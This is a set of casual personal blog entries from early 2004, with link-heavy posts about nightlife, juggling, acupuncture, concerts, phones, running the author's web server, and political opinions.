href='http://sylloge.com/misc_bin/SweetRoxy215.html'>humorous</a> 13 yr old kids messaging him. it is funny. I swear. <br /><br />i <a href='http://www.totalfark.com'>love</a> <a href='http://www.fark.com'>fark</a>. it is so funny. the photoshop contests are <a href='http://forums.fark.com/cgi/fark/comments.pl?IDLink=869629'>insane</a>. those people have some <a href='http://www.hpphoto.com/servlet/LinkPhoto?GUID=5ced33a9-7be5-6776-e2e2-7d5f3c775fa4&amp;size='>talent</a>. <br /> the jay z constructor kit is <a href='http://www.jay-zeezer.com/'>breaking america</a>.<br />so I finally found the coolest site on the internet: <a href='http://www.robo-t.com'>robo-t</a>. it is a collection of pdfs that you can print out on a color printer and fold into 3d robots. it is really awesome. for your browsing pleasure(and cuz it was slow and in japanese) I mirroed the pdfs <a href='http://nata2.info/?path=humor%2Fpdf%2Frobo-t.com'>here</a>. <br /><br />so yea. I am tired. I stayed up late last night. it was fun. I just hung out wiht morgan and talked about books. I really miss reading a bunch. but at the same time - I really like projects. I think I should just lay down and read more. that would prolly solve both problems. haha. umm. wtf am I talking about. I am obviously confused. oh yea. my birthday is soon. I turn 26. whee.</p>

                <p>omg I am a bit hung over. I am not even a lot hung over. I just don&#8217;t usually get hung over - so when I am - I am a baby about it. last night was a mess. it ruled. jon went out with friends - so kayne and I went to a art opening at heaven. there were some pretty good photographs and the like - it was nice. I saw a <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1079148036-t610(1).jpg'>bunch of people</a> I don&#8217;t usually see out, which is always nice. after that we went to a skater party at this awesome space on the soutside. it had a <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1079159102-t610(1).jpg'>half pipe in the living room</a>. it was really insane. I miss skaters. it was the same &#8220;type&#8221; of person I hung out with in high school. which was awesome - especially since both <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1079164000-t610(1).jpg'>jon</a> and <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1079163948-t610(2).jpg'>kayne</a> were here. we hung out for a long time there and eventually made it to the northside for a show at the metro/smartbar. at smartbar there were these amazing djs from cologne. they were impressive. upstairs at metro there was a drum and bass show (which is pretty funny - because I used to spin drum and bass in college for the radio I worked for). it was awesome. I used to be really into shy fx and the like. I miss that. but I don&#8217;t really miss it.. if you know what I mean. heh. we then came home and hung out in my room showing jon all the music that he has missed in the last year. that was awesome. awesome awesome awesome. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;so I was telling morgan awhile agothat I really only have 50 or so words in my vocabulary. it is sorta boring. I need to gain the ability to use more than 50 words a day. I mean I can repeat them but I apparently can&apos;t go over 50. heh. stupid 50. someday I will learn. someday. it will rule. RULE I say. &lt;Br&gt;&lt;br /&gt;i really don&apos;t know what today will bring. there are some tentative plans to play games tonight. which woudl be nice. it is always super entertaining and funny. hopefully matiss will play. that guy is so fun. haha. but unfortuantly he is ditching us for a lady. hahaha. hehehe. I love it. anyway. I should hang out. now. </pre></p>

                <p>So today some terrorists in the basque region of spain <a href='http://www.nytimes.com/2004/03/11/international/europe/11CND-TRAI.html?hp'>blew up a bunch of commuter trains during rush hour</a>. this is after the E.T.A. declared a cease fire on the caralina region of spain - so apparently the terrosist actions are now concentrated on madrid and the like. <br /><br />i know so little about the france/spain/basque conflict that I am very confused. it is interesting to read the reactions of the internet to such a horrible terrorist act. I was specifically interested in what <a href='http://www.russellbeattie.com/notebook/1006663.html'>Russell Beattie </a> would say - as he worked in spain for awhile doing tech stuff and has a seemingly good political stance.

                <p>i fixed it. well I thought I did. until it wouldn&#8217;t reload. I think that our internet <a href='http://www.worldbook.com'>here</a> is really slow. I can&#8217;t even ssh to my boxen. weird. and dumb. wierd and dumb. together at last. man it has been a long caffiene drenched day. umm. yea. so anyway. my original post was going to be like this: so I modified my photolog recently - I made it so the most recent picture shows up on all the pages and then I revamped the photolog to be displayed by month. it looks a little better and is quite a bit quicker. however I could <a href='http://www.xcassociates.com/pics/LEAP.JPG'>significantly increase</a> the speed if I wasn&#8217;t reading the directory as much. I am lazy though and don&#8217;t want to learn perl DB stuff. heh. but anyway. it looks pretty good. I think with the advent of my 6600 - I will make the perl script that posts the pictures resize and submit the filenames and such to a db. it will be oh so much faster then it is now. <br /><br />last night we all hung out at my house and yoyoed and chilled. it was fun. I learned about 3 super nifty yoyo tricks and I really am excited to goto juggling tonight. whippee. <br /><br /><a href='http://morgan.attacktexas.com'>morgan</a> got a <a href='http://www.crunch.com'>promotion</a>. nice work. <br /><br />tired. nap time is fast approaching. I think I have tricked my body into wanting naps everyday from 4-7. it is OK but also suxors. cuz I get sleepy REAL easy. but tonight I will have PLENTY of time to sleep before juggling. k. I have accupuncture again on thursday. I think she will say the same stuff: you shoudl do an activity that stretches your shoulders&#8221; - I shoudl do an activity that makes me move altogether. I really am feeling like I shoudl by a bike. I will probably get a really simple hybred? hmm like a used bike that isn&#8217;t a mountain bike but isn&#8217;t a road bike. and screw the track bikes. I just need one to get around in the <a href='http://www.mts.net/~mkrieger/folio/spring.jpg'>spring and summer</a>. I guess I also have to start goign places. suddenly this got to be really complicated. maybe I will lease an m3 instead. hah.<br /><br />so today on boingboing there were some really good links. first off - rachel&#8217;s friend <a href='http://matthew.onigami.net/'>matthew</a> was <a href='http://boingboing.net/2004_03_01_archive.html#107877117041941091'>listed</a>. that is pretty cool. <a href='http://www.mobagallery.org/index.html'>this</a> museum seems entertaining. having watched a small amount of bollywood movies - I found <a href='http://www.freeorange.net/archives/2004/Mar/09/top_ten_rules_of_indian_filmmaking.htm'>this</a> to be amusing. reality is often replicating <a href='http://customwire.ap.org/dynamic/stories/D/DEAR_ABBY_SIMPSONS?SITE=MIDTN&amp;SECTION=ENTERTAINMENT&amp;TEMPLATE=DEFAULT'>television</a> - or not. <a href='http://underground.zork.net/'>eep</a></p>

                <p>after walking to work. I noticed that I generally feel pretty good - in regards to the stiffness and all the reasons I went to accupuncture. that seems pretty cool. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;on the elevator up to work there was a sign on the thirteenth floor that had a biohazard symbol and a birthday cake. I wasn&apos;t able to read it - I was confused by the combination of those icons. maybe not so much confused as I was worried. heh. umm. biowarfare cakeclass. that is the name of my new band btw. I am gunna play guitar. &lt;br /&gt;&lt;br /&gt;this whole gay marriage thing is stupid. I don&apos;t understand how bush and &quot;the republicans&quot; can be so pigheaded and stupid. how can they actively be supporting such a segregationist movement. it is &lt;a href=&quot;http://conelrad.com/&quot;&gt;pretty insane&lt;/a&gt;. a couple good links: &lt;a href=&quot;http://www.wilwheaton.net/mt/archives/001544.php&quot;&gt;wil wheatons writeup&lt;/a&gt; and then &lt;a href=&quot;http://www.oneeyedcult.com/archives/000036.html&quot;&gt; Cult of the One Eyed Cat&lt;/a&gt;. both argue that the government shoudl not be involved. I guess it ust demonstrates the need to remove general religious morality from our government leadership. this should not be a truth issue - this shoudl be an issue of rights. a social issue - not a morality issue. another interesting way to look at this situation is to take into consideration the &lt;a href=&quot;http://www.corante.com/importance/archives/002111.html&quot;&gt;The Anti-Miscegenation Amendment&lt;/a&gt; - which is an amendment from 1912 that attempted to abolish interracial marriage on the ground that it is &quot;&lt;i&gt;..abhorrent and repugnant. It is subversive to social peace. It is destructive of moral supremacy..&lt;/i&gt;&quot; awesome eh. &lt;b&gt;;)&lt;/b&gt; I think the point that can be taken from this - is that we all look at 1912 and see this ammendment and we think &quot;how ridiculous, they were insane and obviosuly racist&quot; - and then we think how silly and backwards the people who created the ammendment are. but what is missing - is that bush and his henchmen are the same people. they are conservative, upperclass white people - attempting to sell the voters out to big business. they are not caring about the actual issue. they are caring about whether they will continue being in public office - and what the means are to maintain that power: i.e. money.  now I don&apos;t think that it is just a money/corporate/lalala issue - it is obviously based on some &quot;moral truth&quot; that is &quot;wrong&quot; hahaha. what I mean to say is that there is a &quot;moral truth&quot; backing this new anti gay marriage ammendment that is appealing to a lot of americans - regardless of the social and segragationist implications. since &lt;a href=&quot;http://godlovesfags.com/&quot;&gt;god hate gays&lt;/a&gt;, &lt;a href=&quot;http://liberalslikechrist.org/gopvsgay.jpg&quot;&gt;godlovers hate gays&lt;/a&gt;. truth is hard to defeat and bush knows this. I am rambling a bit. heh. however I guess my overall point is that we need to keep in mind the viewpoint of disallowing any social/economic/ethnic/sexuality/etc group of people from doing ANYTHING is segragationist and is a process of creating a subclass of human. it seems that this is somethign that the US is constantly trying to combat around the world - how are we gogn to let this happen here? bush is dumb.</pre></p>

                <p>so my accupunture last night was cool. it strangely seemed to effect my mood - which I was not quite ready for. I was totally a irrational, tired and emotional mess. haha. but I knew it while it was happening - so I just acted weird a couple times and was mostly quiet. I wonder if it was the actual accupunture that put me into a funk or if it was just the fact that I was tired and the pushing myself to be <a href='http://www.ronlim.com/betterstrongerfaster1.gif'>stronger , faster, and better</a>. hah. nobody know. however I do feel pretty good this morning. my arms hur tough&#8230; ha. <br /><br />so my friend jon comes today. it should be fun. I am always a bit apprehensive when friends come to visit for a long time - cuz I don&#8217;t know what to do for entertainment. I figure however. that we will have a fine time just hanging out and such. I am pretty excited. <br /><br />oh. oh. oh. check out this <a href='http://www.evilzug.com/stuff/goatse/tribute/'>goatse tribute page</a>. a really nice presentation <b>;)</b>. if you ever wondered where that <a href='http://nata2.info/humor/flash/pingu.swf'>crazy pinguin game</a> came from - <a href='http://penguin.omnihosts.net/'>here is a pingu history page</a>. and then finally <a href='http://bakla.net/'>this</a> page is almost worth mirroring to insure it never leaves. hah.</p>

                <p>is when you lose a blog entry mid creation. ohhhhh. I hate that a lot. I had written about my night here on bald mountain and how it was a lot of fun and crazy. but now I am not interested in rewriting my entry. sad day. so here is the summary:<blockquote><small>
work dumb<br />
went to bar with matt<br />
bonded with matt<br />
morgan invited us to hang out at watusi<br />
was <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1078377967-t610(3).jpg'>insane</a><br />
went to watusi<br />
craziness<br />
got <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1078422934-t610(4).jpg'>weird scratch</a> on face from wrestling<br />
drank too many beers<br />
went to morgans<br />
forgot sweatshirt<br />
more insanity<br />
work up<br />
</small></blockquote> hate blogs. haha. anyway. yea. it ruled. I had a great time. I did end up drinking a little more than I wished. but whatever. I was lookign for a bruising and I got it. <br /><br /> the weird thing about having problems posting htis entry is that losing it was the second problem. the first was when the entire web server had stopped responding. hehe. maybe god (who doesn&#8217;t exist) has some vendetta against <b>ME</b>. umm. right.. anyway.. nata2 was totally gone - so I logged into the box and restarted the webserver.. it came back and immediately: GONE. so I was like wtf.. I check out the server status and noticed that I was at my peak requests in less than a minute. nata2.info was once again <a href='http://www.lies.com/blog/archives/001328.html'>linked</a> somewhere or something. so I turned on extended status to check out what the haps was. and I <a href='http://dopeman.org/serverstatus.html'>noticed</a> that two ips made up for 95% of the traffic - obviously leeching nata2.info humor. so I added those ips to the hosts.deny. and restarted. GONE were those ips. haha. however I think those ips are soem HUGE proxy server in tokyo. so GONE is my japanese users. haha. check this out though:<blockquote><small>
Server uptime: 1 hour 34 minutes 4 seconds<br />
Total accesses: 18276 - Total Traffic: 3.0 GB<br />
</small></blockquote> i use a lot of bandwidth.<br /><br />tonight I am going to go and do accupuncture. I am rather apprehensive about it. it shoudl be interesting. it is also <a href='http://chris.fm'>chris's</a> bday today - and it is also stephanies.. so happy birthday yall. tomorrow night jon is comign to visit for a week. it should be fun. we are going to paint morgans room I think. haha. it will be just like olden times. rule. <br /><br />ok. now I am just gunna copy <a href='http://www.proxientunit.com'>mike</a> and link to the same stuff that <a href='http://www.proxientunit.com/archives/000141.html'>he did</a>. check out these really <a href='http://www.yossimilogallery.com/lorettaLux/'>spooky picture of children</a>. hehe. and new tork apparently lied all this time about the <a href='http://www.nytimes.com/2004/02/27/nyregion/27BUTT.html?ex=1393218000&en=58284f87fcbbe64d&ei=5007&partner=TECHDIRT'>walk buttons actually working</a>. apparently they haven&#8217;t worked for years and it has all been an attempt to socialize children into pressing buttons. ;) <br /><br />apparently the treasury dept is <a href='http://www.nytimes.com/2004/02/28/national/28PUBL.html'>warning publishers of editing and publishing stuff</a> from our &#8220;enemies.&#8221; I think that this is rather drastic. I guess they are making this decision on the basis that editing/publishing enemy manuscripts would be considered &#8220;trade.&#8221; well. they are totally not attempting to censor the &#8220;enemy&#8221; nations. heh. I am concerned a bit due to the fact that silencing the pen is a rather violent act - and since the U.S. has the clout and infrastructure to create/disseminate media/information accross the world - this could affect the &#8220;planned&#8221; change that the U.S. is expecting. because the dissident who support the U.S. &#8220;changes&#8221; would also be effected. but the organic flow of information that needs to happen in a time of revolution would be stifled. umm. <br />yea. I am done talking about this. <br /><br />yep.</p>

                <p>so I am reading beowulf (or is it <a href='http://anusf.anu.edu.au/wyrd/'>this</a>). it is interesting to read for fun what I once rejected reading for school. however it really brings me back to all the discussions we had about the text. sometimes literary critique is fun. other times <a href='http://www.flipmark.com/testing/art/literary.jpg'>i hate it</a>. <br /><br /></p>

<p>everyonceandawhile I find something that really amazes me in regards to web dev stuff. today it is <a href='http://editcss.mozdev.org/installation.html'>this</a> plugin for <a href='http://www.mozilla.org/products/firefox/'>firefox</a>. it allows you to design css in realtime - watching the results of your tweaking in the browser window - whilst the tweaking happens (and thus realtime - sometimes I am <a href='http://nata2.info/humor/bush/11.jpg'>retarded</a>). it is quite fancy. especially if you are using divs and css to layout a page. go blogs. speaking of blogs. I am really excited for my new phone. I think I am going to make a video blog. it shall be interesting. maybe I will make a flash interface. with <a href='http://www.transfatty.com/supermodelmeat.html'>porn</a>.<br /><br /> I am totally not rambling. but I do have a <a href='http://www.devin.com/transformers/themovie/conv/tm018.jpeg'>surprise for later</a>.</p>

I guess <a href='http://story.news.yahoo.com/news?tmpl=story&u=/ap/20040225/ap_en_mu/punk_voter_6'>this</a> is better. but I guess my gripe is that the media is paying attention to the number imprinted on tickets and whether white middle class alternative youth is going to vote than it is about the haitian crisis that our government is manipulating.

                <p>so my party was fun. I had a good time. it was great fun to see everyone. I was disappointed that some people didn&#8217;t get a chance to show up. but whatever. I now know who my real friends are. haha. umm jk. or am I ;) we had a huge number of people turn out and we ended up drinking all my beers and wines. it was quite nice. <a href='http://johnwhitney.net'>john</a> from <a href='http://www.worldbook.com'>work</a> stopped by.. which was a good surprise. I like it when your <a href='http://www.stanford.edu/~mgorman/spring.gif'>social worlds</a> collide. when different groups come together and meet. the party started about 9 when some people arrived we just kinda hung out until aroudn 10:30 when it started to get a little busy. then around 12 it was <a href='http://www.rediff.com/cricket/2001/jul/06bhisa.jpg'>hectic</a> and I was a bit too drunk to have an incredible time. so I took a nap. haha. until 1. then I hung out with marcia and such until 2:30 -3. I went to bed around 3 - 3:30. it was fun. hiromi&#8217;s date seemed to be cool. he better be really cool however. or we will have to bring the noise. hehe. we are her &#8220;older&#8221; younger brothers. <br /><br />umm then today I basically just slept and screwed around. it was nice. since I took yesterday off too. I have been really taking it easy. which was the goal. I really was bumming and burnt out for awheil and I needed a couple days to do NOTHING. so I got them it rules. tonight we went to the <a href='http://centerstage.net/restaurants/golden-nugget-ravenswood.html'>golden nugget</a> for some foods(it wasn&#8217;t really good - in fact it was <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1078019828-t610(2).jpg'>kinda gross</a>) and then morgan and her friend kristen dropped matiss and I off at our house.. and we went to see <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1078023912-t610(2).jpg'>ludacris, chingy and david banner</a> at the <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1078026937-t610(2).jpg'>congress</a>. that was hilarious. I love going to concerts that don&#8217;t fit my stylistic demographic. it cracks me up. we then came home and chilled out. ate soem left overs and wacthed <a href='http://www.freddyvsjason.com/?trailer'>freddy vs jason.</a> now I am going to bed cuz I gotta get up early and go watch morgan at her <a href='http://isnow.com/'>hair show</a>. hehe. the &#8220;outkast&#8221; is awesome. truly amazin. (i have been dropping the G from a lot of ing words lately. I gotta watch that) <br /><br />i think I may have acquired <a href='http://nokia.com/nokia/0,,33210,00.html'>a new phone</a>. we shall see. if so. it will be the second phone I have got in the last month. umm. I may have a problem. hehe. yea about that.</p>

                <p>I woke up and attempted my hardest to not make it to work. however, much to my chagrin, I now find myself at work. on the way in - I listened to midnight oil&#8217;s diesel and dust. I have been listening to music from my past lately. it is pretty fun. yesterday I purchased a bunch of <a href='http://phobos.apple.com/WebObjects/MZStore.woa/wa/viewArtist?artistId=26435'>crosby and nash</a> and then a bunch of <a href='http://phobos.apple.com/WebObjects/MZStore.woa/wa/viewArtist?artistId=147370'>neil young</a>. both are so so good. <a href='http://phobos.apple.com/WebObjects/MZStore.woa/wa/viewAlbum?playlistId=614915'>neil</a> <a href='http://phobos.apple.com/WebObjects/MZStore.woa/wa/viewAlbum?playlistId=614991'>young</a> is quite something. the song &#8221;<a href='http://phobos.apple.com/WebObjects/MZStore.woa/wa/viewAlbum?playlistId=614915&selectedItemId=614889'>The Needle and the Damage Done</a>&#8221; is sad. hah. <br /><br />i am attempting to import all my super old 2k blog entries. I found them on archive.org. so that may be done later tonight. we shall see. they are pretty funny. <br /><br />check out <a href='http://www.proxientunit.com/'>mikes blog</a>.<br /><br />i think I need to take a day off or something. I really need to want to come back to work. I think havign this past weekend be so full of events(especially ones that I felt some sort of accountability for) I didn&#8217;t get a good chance to sleep in and just screw around. so my body/mind didn&#8217;t have a good amount of time to just screw around and relax. I need to sit in a decompression chamber and let everything leave my mind/body and wonder around - coming back when it wants to. I think that woudl help with my boredom/strangeness as of late. haha. but then.. I don&#8217;t think I am really strange.. just not really settled. heh. <br /><br />last night - matt and I walked to the liquor store and got beers and drank them on the way(we walked) to the movie theater to see eurotrip(it was bad). it was a really fun time. movies are expensive however. it doesn&#8217;t really make sense how expensive they got. it cost me 15 dollars to get in and get a small amount of food. I coudl have purchased a domain name.. and hung out and made a webapp to make fun of <a href='http://derek.broox.com'>derek</a> for that much money. <br /><br />i really want to see osama and the passion soon.</p>

                <p>A week and a half ago <a href='http://www.christophersaathoff.com/'>chris saathoff</a> was killed by a drunk driver.

                <p>i was so weird yesterday. I didn&#8217;t want to be at work. so I just did my work without mentioning a word to anyone - and I reacted poorly when I was spoken too. it was <a href='http://womanstouch.ag.org/womanstouch/newimages/3-4-02/5_20_annoying%20guy.jpg'>annoying</a> even to me.. I guess I was coming <a href='http://www.abc.net.au/news/featuregraphics/2002/07/20020702fossettballoon.jpg'>down from the high</a> of my awesome (and tiring) weekend. I just wanted to go home and get a hug from someone. or go home and sleep (which is essentially what I did). It was funny - cuz I really <a href='http://www.digitalstoryteller.com/BTV99/hartley/images/small/0131BNSF_derailment_11-98.jpg'>felt weird</a> - as though my batteries had worn down. but as soon as I was eating - I felt sooo much better to the point where I realized that the reason for the season was my lack of eating (the one thing I often forget to do). I need to remind myself to take better care of myself. I am really thinking of <a href='http://www.lovelylowrider.com/bulletbondobike.jpg'>getting a bike</a>. but I want one I could possibly afford to lose (i tend to lose big things). I just know I would ride it to a bar and then wake up a week later and remember that it &#8220;was&#8221; locked to a pole by some bar. I don&#8217;t think I would be happy if it was some fancy bike. ok. <br /><br />i am better today though. it is nice to get sleep. I made my bed awesome so sleeping was really exciting. after sleeping it is easy to remember how <a href='http://freepages.genealogy.rootsweb.com/~mysouthernfamily/photos/higginbothamjosephaCSAi17159.jpg'>awesome my life really is</a>. ahhh.. umm. yea. <br /><br />here is how to make a <a href='http://shitbegone.com/moneywallet/index2.html'>money wallet</a>. here is how to <a href='http://www.nata2.info/?path=humor%2Fpictures&img=wrist.gif'>ensure death</a> hehe. here is how to be <a href='http://www.rodrickbrown.com/denied.wmv'>bummed out</a>. here is <a href='http://www.helenandbarry.com/WilliamHung.wmv'>how to dance</a>. <br /><br />this weekend is going tobe fun. we are having a small get-to-gether(hehe) on friday and then I have tickets to see ludacris and cannibal corpse. sounds like a winner. morgan&#8217;s roommate is leaving soon so there is also a party for him.. he is really cool. check out his <a href='http://www.parallaxonline.org/index.html'>site/company/ethics journal</a>. <br /><br />don&#8217;t forget to check out <a href='http://war.watership.org'>war.watership.org</a> or to <a href='http://dopeman.org/ambient/'>modify my ambient orb</a>.<br /><br />i am bored today.

I am teh roxor for sure. hehe.<br /> ok enough</p>

                <p>Last night was so dope. We, the <a href='http://www.thejugglers.org'>J.O.D.</a> juggled at chris holmes&#8217; electro shw at te metro. it was sooo much fun. all my friends were there - and it was great to juggle with matt, matiss and brad. so much fun. <a href='http://nata2.info/?path=pictures%2Fevents%2Fchris_holmes_electroclash_02-04'>here are pictures</a>. The show was insane. first we started with some knife juggling while chris and aaron did their song.. then sparklemotion came out.. and did their thing. song three was <a href='http://nata2.info/?path=pictures%2Fevents%2Fchris_holmes_electroclash_02-04&img=JOD%20metro%20051.jpg'>Brian Liesegang</a> doing rock you like a hurricane. Song four was the virgin tears song&#8230; and then song five was I wanna new drug with <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1077436735-t610(3).jpg'>billy corrigan</a>. The show was really good - highlights being juggling on the metro stage - and the 15 minute noisey guitar solo by billy. rock. the who thing was so surreal and so awesome. hopefully we will get to do more show slike this. <br /><br />it was also really dope - cuz I got to see a bunch of <a href='http://nata2.info/?path=pictures%2Fevents%2Fchris_holmes_electroclash_02-04&img=JOD%20metro%20088.jpg'>friends</a> I haven&#8217;t <a href='http://nata2.info/?path=pictures%2Fevents%2Fchris_holmes_electroclash_02-04&img=JOD%20metro%20089.jpg'>seen</a> in <a href='http://nata2.info/?path=pictures%2Fevents%2Fchris_holmes_electroclash_02-04&img=JOD%20metro%20108.jpg'>awhle</a>. the best/worst was when amjad decided t pour his drink <a href='http://nata2.info/?path=pictures%2Fevents%2Fchris_holmes_electroclash_02-04&img=JOD%20metro%20103.jpg'>on my head</a> - I should remember that he has that tendency. it was awesome to <a href='http://nata2.info/?path=pictures%2Fevents%2Fchris_holmes_electroclash_02-04&img=JOD%20metro%20080.jpg'>dance</a> with <a href='http://nata2.info/?path=pictures%2Fevents%2Fchris_holmes_electroclash_02-04&img=JOD%20metro%20055.jpg'>morgan</a> - and eventually we got <a href='http://nata2.info/?path=pictures%2Fevents%2Fchris_holmes_electroclash_02-04&img=JOD%20metro%20081.jpg'>matiss and erica</a> out on the dance floor.<br /><br /><a href='http://nata2.info/?path=pictures%2Fevents%2Fchris_holmes_electroclash_02-04&img=JOD%20metro%20006.jpg'>i love corndogs</a></p>

                <p>last night morgan and I watched <a href='http://imdb.com/title/tt0048434/'>night and fog</a> - a really good documentary on the horrors of the german concentration camps in europe during world war II. It was the first time I had seen actual movie footage of all the bodies and such. it was quite haunting. I am not a fan of genocide. I thought that the end of the documentary was quite appropriate - with the message that the enemy is &#8220;us.&#8221; <br /><br />i am sad that I haven&#8217;t had the time or patience to really write a good solid blog entry. lately I have been so busy at work that I don&#8217;t usually have time to sit and write out an entry - so I open this editing dialog and then it sits for 5 hours.. this is probably why my blog seems like it is written by a crackhead. alas.. I will attempt to schedule more time to blogging ;)</p>

                <p>So.. a friend of mine messaged me and was rather freaked out by the fact that a <a href='http://www.geocities.com/must_be_pop2001/index.html'>online celebrity RPG</a> was stalking her. heh. I did a bit of research and I noticed that <a href='http://ironkungfu.com/wiki/index.php/why%20people%20are%20bad'>the entire kill hannah group</a> is enveloped in this stupid internet false world. hehe. weird. sometimes the world is insane. INSANE I say.<br /><br /> what are peoples fascination with death in june and boyd rice. why is it that people will defend these bands as not being racist, fascist, misanthropic or generally skinhead-ish. I just have this general philosophy that I don&#8217;t really want to associate myself with anything that skinheads are associated with. for instance I really try and dissasociate myself from all skinhead like activities - including listening to &#8220;fascist&#8221; music. ;)<br /><br />last night ruled. I got home from a rather nice day at work - and ate guacamole with hiromi and then took a nap until 7. Mark came and picked me up - we went to the kill hannah show at metro.. also to check out the metro stage ;). we had a short yoyo demo on the balcony for pretty girls.. and then mark and I went to juggling club. juggling club is ruling right now. we had 20 members last night. after juggling I went to watusi for the kill hannah party and hung out with everyone.. and saw morgan. we then all went to slicks. it was nice. I enjoy dancing.. at this point I was dieing of starvation - so I escaped and morgan and I went to cafe taco and got their last tacos of the night. we ate them. then died. it is rougher than I remember - drinking and staying up late. eep. I couldn&#8217;t deal with reality this morning.</p>

                <p>so this weekend was pretty fun. on friday I hung out with morgan and we went to a art opening at my friend <a href='http://www.redrocketgallery.com'>lenores gallery</a>. the opening was fun - but the hanging out was really good. after this event, we went to a party where a pinata filled with cayan pepper was exploded prior to our arrival. it was rather abrasive on my poor nasal passage ;). we hung out here and drank rather rough gin drinks until we got hungry enough to leave. we ate at clarks and we acted like we were straightedge. it ruled.<pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;</pre></p>

<p>Sooo. valentines day was quite fun. I met morgan at the train (after apparently almost getting mugged by the most lackadaisical mugger: I just said no) and we went to the &lt;A href=&#8221;http://nata2.info/?path=pictures%2Fholidays%2Fvalentines_04&#8221;&gt;monster truck rally&lt;/a&gt;. it was really fun. a perfect valentines date. it ruled. I liked <a href='http://www.gravedigger.com'>gravedigger</a> the best ;).the strangest part were all the little kids without ear plugs. so sad. a couple of them were obviously uncomfortable. so after the monster truck rally - we went to morgans house and hung out with my roommate matt, alan, colby, felice and morgans roomates:jeremy and tanya. we hung out, ate cheese, and drank margaritas and beers. it was fun. eventually we played the word game. which was quite fun - because everyone is interested in spelling. then everyone left. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;Br&gt;&lt;br /&gt;and it suddenly was morning. today I was really off in regards to my bodies feelings.. .heh.. I basically watched movies and slept ALL day. it ruled. I imagine I will goto sleep soon.. and then wake up refreshed. I do need to buy some decongetants or whatever. &lt;Br&gt;&lt;br /&gt;today my friend told me how he met bill gates. I think that is insane. he could buy all his friends and his families lives with very very little work. that is screwed up. hah. anyway. I am watching a movie..so this whole entry probably doesn&apos;t make a damn bit of sense. but whatever. I am the roxor.</pre></p>

                <p>So I lost reality the other night. I was sittign at work - going live with this product (FINALLY) amd I noticed reality slinking out the door(<a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1076573111-picture(4).jpg'>1</a>, <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1076573183-picture%281%29.jpg'>2</a>, <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1076573365-picture%282%29.jpg'>3</a>). I was pretty sure at that point that my life was going to get weird, so as any good boy would do - I just gave in and drank a lot more mt. dew. <br />so what happened was this. we (WB) went live with this product on wednesday night. I was part of the night team - so I had a bunch of <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1076562062-picture(2).jpg'>pop, 6 fruit rollups and a bunch of peanuts</a> in about 3 hours. I then wanted to die. I stayed up <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1076562803-picture(2).jpg'>delerious and wronged</a> until 9am with very very little sleep. I was able to have some fun though&#8230; and I did end up <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1076565230-picture(2).jpg'>watching some movies</a>. once I left work I was able to go to wicker park - where I about died of horrible poisoning from the bastardized version of breakfast mcdonalds sells - and sleep. once asleep, I really didn&#8217;t notice anything happening until I woke up. morgan then beat me up and punched me in the throat. we hung out. then I attempted to go home and crash hard. however, my inner child was rebelling and made me goto a shoe store to <a href='http://www.nata2.info/pictures/misc/phone_camera/photolog/1076686597-t610%281%29.jpg'>buy future</a> <a href='http://www.citysoles.com/cs/products/03126f.html'>shoes</a>. I made out like a bandit - a poor poor bandit. I then proceded to go home and sleep for not long enough. I hung out with matt and hiromi and then watched a bunch of dumb TV. it is nice it currently works. but it will soon stop I know it. I then went to morgans house to help her with her <a href='http://www.lathallan.com/timeline/Fullsize/0945am.jpg'>secret project</a>.</p>

                <p>So I got my <a href='http://www.nata2.info/pictures/misc/phone_camera/photolog/1076517802-picture%282%29.jpg'>sidekick</a> last night - and it has already proven to be a good deal. I got it through a place called <a href='http://www.simplycells.com/index.php?Affiliate_Name=go065&amp;UID=new+sidekick+general'>simplycells.com</a> for around $79 with activation and rebates. but I just added it to my current tmobile account and got a new number for it. I removed the voice minutes and just have it for data. so it is only about 29/month. which is pretty dope. I will still use my t610 as my primary phone, so I won&#8221;t have to worr yabout carrying around this hulking giant to a club and what not (which is the most important thing). the sidekick is pretty fly. I can instant message with near realtime results. the thumb keyboard is quite usable and the ssh client has already been a life saver(i remembered on the train that I needed to log into my server and restart apaache - so I did it <b>;)</b>). but yea. it is fun. my two complaints is that the browser sucks and that the mail client isn&#8217;t truely imap. those two things drive me batty. but the browser is easy to understand. now why the imap client isn&#8217;t real imap - I have no idea. it is dumb and frustrating. I plan to write or fix a blog reader so I can stay abreast of my news. that should be fun. then I woudln&#8217;t never have to actually goto a computer for fun. since I got IRC with the ssh client, IM with the AIM client and then blog reading. go RSS. <br /><br />ok I am going home. I have to work tonight so I get to go home and sleep. I am thrilled about it. w0000t. I am the roxor. haha. ok <br /> gnight.</p>

